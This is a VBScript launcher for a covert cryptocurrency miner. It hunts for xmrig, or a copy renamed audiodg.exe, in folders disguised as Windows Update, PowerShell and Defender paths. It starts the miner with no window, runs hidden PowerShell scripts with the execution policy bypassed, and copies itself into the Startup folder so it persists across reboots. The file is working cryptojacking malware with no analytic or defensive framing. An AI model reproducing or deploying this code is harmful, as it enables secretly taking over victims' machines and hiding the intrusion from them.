' =====================================================================
' SILENT_LAUNCH.vbs - Fully Silent + Auto Fix Hashrate Version
' =====================================================================
' - Auto detects miner location
' - Starts miner if not running
' - Runs AUTO_FIX_HASHRATE.ps1 from the same folder
' - Adds itself to Startup (runs on every restart)
' - Zero popups / zero windows
' =====================================================================

Option Explicit
On Error Resume Next

Dim WshShell, fso, minerFolder, minerExe, configFile
Dim deployScript, fixScript, vbsName, startupFolder, currentFolder
Dim objWMIService, colProcesses, found, folder
Dim possibleFolders(7)

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ========== Possible miner locations ==========
possibleFolders(0) = "C:\ProgramData\Microsoft\Windows\WindowsUpdate"
possibleFolders(1) = "C:\ProgramData\WindowsUpdater"
possibleFolders(2) = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv"
possibleFolders(3) = "C:\ProgramData\Microsoft\Network\Downloader"
possibleFolders(4) = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\PowerShell"
possibleFolders(5) = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\Defender"
possibleFolders(6) = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates"
possibleFolders(7) = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\WindowsUpdateCache"

' Get current folder of this VBS
currentFolder = fso.GetParentFolderName(WScript.ScriptFullName)
deployScript  = currentFolder & "\DEPLOY_ULTIMATE.ps1"
fixScript     = currentFolder & "\AUTO_FIX_HASHRATE.ps1"

vbsName       = "SILENT_LAUNCH.vbs"
startupFolder = WshShell.SpecialFolders("Startup") & "\" & vbsName

' ========== Auto-detect miner ==========
found = False

For Each folder In possibleFolders
    If fso.FolderExists(folder) Then
        If fso.FileExists(folder & "\audiodg.exe") And fso.FileExists(folder & "\config.json") Then
            minerFolder = folder
            minerExe    = folder & "\audiodg.exe"
            configFile  = folder & "\config.json"
            found = True
            Exit For
        End If
        If fso.FileExists(folder & "\xmrig.exe") And fso.FileExists(folder & "\config.json") Then
            minerFolder = folder
            minerExe    = folder & "\xmrig.exe"
            configFile  = folder & "\config.json"
            found = True
            Exit For
        End If
    End If
Next

' ========== If miner found → start it + run auto fix ==========
If found Then
    ' Start miner if not running
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * From Win32_Process Where Name = '" & fso.GetFileName(minerExe) & "'")

    If colProcesses.Count = 0 Then
        WshShell.Run """" & minerExe & """ --config=""" & configFile & """ --randomx-1gb-pages --no-color", 0, False
    End If

    ' Run AUTO_FIX_HASHRATE.ps1 silently from same folder
    If fso.FileExists(fixScript) Then
        WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & fixScript & """", 0, False
    End If

Else
    ' Miner not found → try to run DEPLOY_ULTIMATE.ps1 (will show UAC only if needed)
    If fso.FileExists(deployScript) Then
        WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & deployScript & """", 0, False
    End If
End If

' ========== Add to Startup folder (for every restart) ==========
If Not fso.FileExists(startupFolder) Then
    fso.CopyFile WScript.ScriptFullName, startupFolder, True
End If

WScript.Quit